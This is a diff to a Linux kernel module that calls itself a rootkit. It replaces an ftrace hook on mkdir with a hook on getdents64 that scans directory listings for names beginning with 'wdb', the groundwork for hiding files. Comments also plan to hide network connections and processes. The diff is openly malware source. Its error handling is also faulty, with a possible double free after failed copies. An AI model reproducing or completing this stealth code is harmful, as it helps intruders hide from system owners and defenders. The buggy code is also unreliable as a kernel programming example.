@@ -5,7 +5,11 @@
 #include <linux/kallsyms.h>
 #include <linux/version.h>
 #include <linux/namei.h>
+#include <linux/dirent.h>
 
+#include "ftrace_helper.h"
+
+#define PREFIX "wdb"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("otitoko");
@@ -17,7 +21,8 @@ MODULE_VERSION("0.1");
 #endif
 
 #ifdef PTREGS_SYSCALL_STUBS
-static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
+static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
+
 //hide file
 //hide network connections/ports
 //hide processes
@@ -64,33 +69,49 @@ asmlinkage int hooked_kill(const struct pt_regs *regs){
 static struct ftrace_hook hooks[]={HOOK("__x64_sys_kill", hooked_kill, &orig_kill)};
 */
 
-asmlinkage int hook_mkdir(const struct pt_regs *){
-	char __user *pathname = (char *)regs->di;
-	char dir_name[NAME_MAX] = {0};
+asmlinkage int hook_getdents64(const struct pt_regs *regs){
+	unsigned long offset=0;
+	struct linux_dirent64 __user *dirent=(struct linux_dirent64*)regs->si;
+	
+	struct linux_dirent64 *dirent_ker,*current_dir = NULL;
 
-	long error =strncpy_from_user(dir_name, pathname, NAME_MAX);
-	if(error>0)
-		printk(KERN_INFO "rootkit creating dir with anem %s\n",dir_name);
+	int ret=orig_getdents64(regs);
+	dirent_ker=kzalloc(ret,GFP_KERNEL);
 
-	orig_mkdir(regs);
-	return 0;
+	if((ret<=0)||(dirent_ker==NULL))
+		return ret;
+
+	long error;
+	error=copy_from_user(dirent_ker,dirent,ret);
+	if(error){
+		printk(KERN_ERR "could not copy from user: %l bytes left",error);
+		kfree(dirent_ker);
+	}
+
+	while(offset<ret){
+		current_dir=(void *)dirent_ker+offset;
+
+		if(memcmp(PREFIX,current_dir->d_name,strlen(PREFIX))==0){
+			printk(KERN_DEBUG "rootkit wazzzaaaaaaa: %s",current_dir->d_name);
+		}
+		offset+=current_dir->d_reclen;
+	}
+	error=copy_to_user(dirent,dirent_ker,ret);
+	if(error){
+		printk(KERN_ERR "could not copy to user: %l bytes left",error);
+		kfree(dirent_ker);
+	}
+
+
+	kfree(dirent_ker);
+	return ret;
+
 }
 #else
-static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
-
-asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){
-	char dir_name[NAME_MAX]={0};
-	long error = strncpy_from_user(dir_name, pathname,NAME_MAX);
-
-	if(error>0)
-		printk(KERN_INFO "rootkit creating dir with anem %s\n",dir_name);
-	orig_mkdir(pathname,mode);
-	return 0;
-}
 #endif
 
 static struct ftrace_hook hooks[] = {
-	HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
+	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
 };
 static int __init basic_init(void){
 
